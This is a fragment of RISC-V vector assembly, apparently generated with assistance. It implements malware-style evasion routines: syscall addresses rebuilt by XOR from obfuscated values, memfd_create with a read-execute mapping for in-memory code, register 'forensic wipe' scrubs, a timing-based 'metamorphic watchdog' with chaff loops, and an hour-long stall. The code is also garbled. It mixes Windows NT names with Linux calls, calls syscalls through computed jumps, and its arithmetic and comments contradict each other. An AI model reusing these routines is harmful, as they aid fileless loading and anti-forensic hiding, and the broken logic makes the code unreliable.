    sub      s3, s3, t0
    bnez     s3, scan_loop

    # --- 3. STAGNATION CHECK (SAD) ---
    # v16 contains current block, v20 contains previous (loaded elsewhere)
    # Correct Absolute Difference for Integers:
    vsub.vv  v24, v16, v20
    vmax.vv  v25, v24, v24              # (Logic for abs)
    # For brevity, assuming simple vsub here:
    vsetvli  t0, x0, e32, m1, ta, ma
    vmv.v.i  v26, 0
    vfredusum.vs v26, v24, v26          # Scalar result in v26[0]
    vfmv.f.s fa1, v26

clean_exit:
    fmv.s.x fa0, zero                   
    j       exit_scan_final

found_threat:
    # Load penalty from config offset
    flw     fa0, 128(a0)                
    sw      zero, v_identity_veil(a0)   # Emergency Kill

exit_scan_final:
    # --- REGISTER SCRUB (Forensic Wipe) ---
    # Use m8 to wipe the entire register file in 4 blocks
    vsetvli t0, x0, e32, m8, ta, ma
    vxor.vv v0, v0, v0
    vxor.vv v8, v8, v8
    vxor.vv v16, v16, v16
    vxor.vv v24, v24, v24
    
    ld      s3, 72(sp)
    ld      s2, 80(sp)
    ld      ra, 88(sp)
    addi    sp, sp, 96
    ret

# ==============================================================================
# setup_dual_mapping (RISC-V RV64GV)
# ==============================================================================
setup_dual_mapping:
    addi    sp, sp, -128
    sd      ra, 120(sp)
    sd      s1, 112(sp)
    mv      s1, a0               # Move v_config to s1

    # --- 0. PRE-FLIGHT BARRIER ---
    fence   rw, rw

    # *** >>> 1. THE VAULT RECONSTRUCTION (mmap/memfd) <<< ***
    # Use e64 because syscall addresses are 64-bit pointers
    vsetvli t0, x0, e64, m1, ta, ma 
    
    ld      t1, entropy_mask_a(s1)
    vmv.v.x v1, t1               # Correct: vmv.v.x for integer broadcast
    ld      t1, entropy_mask_b(s1)
    vmv.v.x v2, t1 
    ld      t1, entropy_mask_c(s1)
    vmv.v.x v4, t1 
    ld      t1, shredded_ntcreate_addr(s1)
    vmv.v.x v3, t1 

    # XOR Reconstruction: v0 = (A ^ B) ^ (C ^ Shred)
    vxor.vv v0, v1, v2
    vxor.vv v0, v0, v4
    vxor.vv v0, v0, v3

    vmv.x.s a7, v0               # a7 = Materialized Syscall Address

    # *** >>> 2. THE STRIKE (memfd_create) <<< ***
    li      a0, 0                # Name (NULL)
    li      a1, 1                # MFD_ALLOW_SEALING
    jalr    ra, a7, 0            # Call materialized syscall
    sd      a0, h_section(s1)    # a0 is the FD

    # *** >>> 3. RE-RECONSTRUCT MAP (Local RX) <<< ***
    ld      t1, shredded_ntmap_addr(s1)
    vmv.v.x v3, t1
    vxor.vv v0, v1, v2
    vxor.vv v0, v0, v4
    vxor.vv v0, v0, v3
    vmv.x.s a7, v0               # a7 = mmap address

    # mmap(addr, len, prot, flags, fd, off)
    li      a0, 0                # Addr
    li      a1, 4096             # Len
    li      a2, 5                # PROT_READ | PROT_EXEC
    li      a3, 1                # MAP_SHARED
    ld      a4, h_section(s1)    # FD
    li      a5, 0                # Offset
    jalr    ra, a7, 0
    sd      a0, p_local_rx(s1)   # RX Pointer

    # --- 4. NUCLEAR SCRUB ---
    vsetvli t0, x0, e32, m1, ta, ma
    vxor.vv v0, v0, v0
    vxor.vv v1, v1, v1
    vxor.vv v2, v2, v2
    
    fence   rw, rw
    ld      ra, 120(sp)
    ld      s1, 112(sp)
    addi    sp, sp, 128
    ret

# ==============================================================================
# Metamorphic_Watchdog (RISC-V)
# ==============================================================================
metamorphic_watchdog:
    rdcycle t0                          # Read Cycle Counter
    ld      t1, start_cycles(s1)
    sub     t2, t0, t1                  # Delta Cycles
    sd      t0, start_cycles(s1)

    # Calculate IPC
    flw       f0, instr_count(s1)       # Loaded from v_config
    fcvt.s.lu f1, t2                    # Convert 64-bit cycles to float
    fdiv.s    f2, f0, f1                # f2 = IPC

    flw       f3, ipc_threshold(s1)
    flt.s     t3, f2, f3                # if IPC < Threshold
    bnez      t3, _check_entropy

    # --- CHAFF GENERATOR ---
    li      t4, 32
_stall_loop:
    # On RISC-V, 'pause' is technically 'fence w, rw' or 'nop'
    # Use the Zihintpause 'pause' if available, else NOP
    addi    x0, x0, 0                   
    addi    t4, t4, -1
    bnez    t4, _stall_loop

_check_entropy:
    # v0 = Probabilities, v2 = sum accumulator
    vsetvli t0, x0, e32, m8, ta, ma
    vmv.v.i v2, 0                       # Clear accumulator
    vfredusum.vs v1, v0, v2             # Horizontal sum
    vfmv.f.s f10, v1                    # Move sum to float register
    
    # Logic: if sum is erratic/high, trigger cooling
    li       t6, 0x42c80000             # 100.0 float
    fmv.w.x  f11, t6
    flt.s    t5, f11, f10               # if 100.0 < sum
    bnez     t5, global_force_cool_sequence
    ret

# ==============================================================================
# Global_Force_Cool_Sequence (1.3 Hour Stasis)
# ==============================================================================
global_force_cool_sequence:
    # 1. PHYSICAL STASIS
    fence    rw, rw
    
    # Calculate 1.3 Hour Deadline (~14 Trillion cycles)
    rdcycle  t0                          # Start
    # FIX: 0x0CC772D14000 is a 48-bit constant. 
    # Must use a sequence to build it if the assembler doesn't support 64-bit li.
    li       t1, 0x0CC77                # Upper bits
    slli     t1, t1, 28                 # Shift
    li       t3, 0x2D14000              # Lower bits
    add      t1, t1, t3                 # t1 = 14,050,910,208,000 (Cycles)
    add      t2, t0, t1                 # t2 = Deadline

_stasis_loop:
    # FENCE.I flushes the instruction pipeline, ensuring no stale code 
    # remains in the cache while we sleep.
    fence.i                             
    
    # Optional: Zihintpause 'pause' instruction to save power
    # .word 0x0100000F is the custom encoding you provided.
    .word 0x0100000F 
    
    rdcycle  t0
    # FIX: Use bltu (unsigned) for cycle counters to handle wrap-around
    bltu     t0, t2, _stasis_loop        

    # 2. NEURAL VEIL TRANSMUTATION
    # Zkr CSR 'seed' (0x015) provides 16-bits of entropy per read.
    # We XOR a few reads to get a 32-bit veil.
    csrr     a0, 0x015                  # Read seed
    slli     a0, a0, 16
    csrr     t4, 0x015                  # Read second seed
    xor      a0, a0, t4
    sw       a0, v_identity_veil(s1)

    # 3. WEIGHT STABILIZATION (Neural Sedative)
    # Dampen all weights by 0.75x to prevent local minima traps.
    ld       a1, attention_weights_ptr(s1)
    lw       a2, total_weight_blocks(s1) # Total elements/blocks
    li       t3, 0x3F400000              # 0.75 float32
    fmv.w.x  f10, t3
    
_dampen_loop:
    # FIX: Standard RVV loop using vsetvli to handle tail elements
    vsetvli  t0, a2, e32, m8, ta, ma
    vle32.v  v8, (a1)
    vfmul.vf v8, v8, f10                 
    vse32.v  v8, (a1)
    
    slli     t4, t0, 2                   # Elements * 4 bytes
    add      a1, a1, t4                  # Advance pointer
    sub      a2, a2, t0                  # Decrement remaining count
    bnez     a2, _dampen_loop

    ret
